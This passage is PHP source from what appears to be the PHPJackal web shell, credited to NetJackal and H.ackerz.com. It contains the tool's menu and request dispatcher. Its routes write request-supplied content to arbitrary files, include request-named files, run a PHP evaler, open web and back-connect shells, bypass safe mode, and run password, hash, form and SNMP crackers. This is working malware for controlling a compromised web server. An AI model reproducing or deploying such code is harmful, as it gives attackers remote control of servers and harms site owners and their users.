<li <?php if($_REQUEST['seC']=='sqlcl')echo 'class="active"'?>><a href="<?php echo hlinK("seC=sqlcl&workingdiR=$cwd");?>">SQL client</a></li>
<li <?php if($_REQUEST['seC']=='ftpc')echo 'class="active"'?>><a href="<?php echo hlinK("seC=ftpc&workingdiR=$cwd");?>">FTP client</a></li>
<li <?php if($_REQUEST['seC']=='mailer')echo 'class="active"'?>><a href="<?php echo hlinK("seC=mailer&workingdiR=$cwd");?>">Mail sender</a></li>
<li <?php if($_REQUEST['seC']=='eval')echo 'class="active"'?>><a href="<?php echo hlinK("seC=eval&workingdiR=$cwd");?>">PHP evaler</a></li>
<li <?php if($_REQUEST['seC']=='sc')echo 'class="active"'?>><a href="<?php echo hlinK("seC=sc&workingdiR=$cwd");?>">Scanners</a></li>
<li <?php if($_REQUEST['seC']=='cr' || $_REQUEST['seC']=='dic' || $_REQUEST['seC']=='auth' || $_REQUEST['seC']=='fcr' || $_REQUEST['seC']=='snmp' || $_REQUEST['seC']=='hc')echo 'class="active"'?>><a href="<?php echo hlinK("seC=cr&workingdiR=$cwd");?>">Crackers</a></li>
<li <?php if($_REQUEST['seC']=='px')echo 'class="active"'?>><a href="<?php echo hlinK("seC=px&workingdiR=$cwd");?>">Web pr0xy</a></li>
<li <?php if($_REQUEST['seC']=='steg')echo 'class="active"'?>><a href="<?php echo hlinK("seC=steg&workingdiR=$cwd");?>">Stegano</a></li>
<li <?php if($_REQUEST['seC']=='tools')echo 'class="active"'?>><a href="<?php echo hlinK("seC=tools&workingdiR=$cwd");?>">Tools</a></li>
<li <?php if($_REQUEST['seC']=='calc')echo 'class="active"'?>><a href="<?php echo hlinK("seC=calc&workingdiR=$cwd");?>">Converter</a></li>
<li <?php if($_REQUEST['seC']=='phpjackal')echo 'class="active"'?>><a href="<?php echo hlinK("seC=phpjackal&workingdiR=$cwd");?>">PHPJackal</a></li>
<li <?php if($_REQUEST['seC']=='about')echo 'class="active"'?>><a href="<?php echo hlinK("seC=about&workingdiR=$cwd");?>">About</a></li>
<?php if(isset($_COOKIE['passw']))echo '<li><a href="'. hlinK("seC=logout").'">Logout</a></li>';?>
</ul></div>
<div class="right">
<div class="content">
<?php
if(!empty($_REQUEST['seC'])){
switch($_REQUEST['seC']){
case 'fm':filemanageR();break;
case 'sc':scanneR();break;
case 'phpinfo':phpinfo();break;
case 'edit':
if(!empty($_REQUEST['Save'])){
$filehandle=fopen($_REQUEST['filE'],'w');
fwrite($filehandle,$_REQUEST['edited']);
fclose($filehandle);}
if(!empty($_REQUEST['filE']))editoR($_REQUEST['filE']);else editoR('');
break;
case 'openit':openiT($_REQUEST['namE']);break;
case 'cr':crackeR();break;
case 'dic':dicmakeR();break;
case 'tools':toolS();break;
case 'hex':hexvieW();break;
case 'img':showimagE($_REQUEST['filE']);break;
case 'inc':if(file_exists($_REQUEST['filE']))include($_REQUEST['filE']);break;
case 'hc':hashcrackeR();break;
case 'fcr':formcrackeR();break;
case 'auth':authcrackeR();break;
case 'ftpc':ftpclienT();break;
case 'eval':phpevaL();break;
case 'phpjackal':phpjackal();break;
case 'snmp':snmpcrackeR();break;
case 'px':pr0xy();break;
case 'steg':stegn0();break;
case 'webshell':webshelL();break;
case 'mailer':maileR();break;
case 'br':brshelL();break;
case 'asm':safemodE();break;
case 'sqlcl':sqlclienT();break;
case 'calc':calC();break;
case 'sysinfo':sysinfO();break;
case 'checksum':checksuM($_REQUEST['filE']);break;
case 'logout':logouT();break;
default: echo $intro;}}else echo $intro;
?>
<div id="footer" style="margin-top:100px; width:500px">&copy; 2010 <a href="http://h.ackerz.com"><strong>H.ackerz.com</strong></a><br/>Created by NetJackal
</div>
</div>
</div>
</body>
</html>
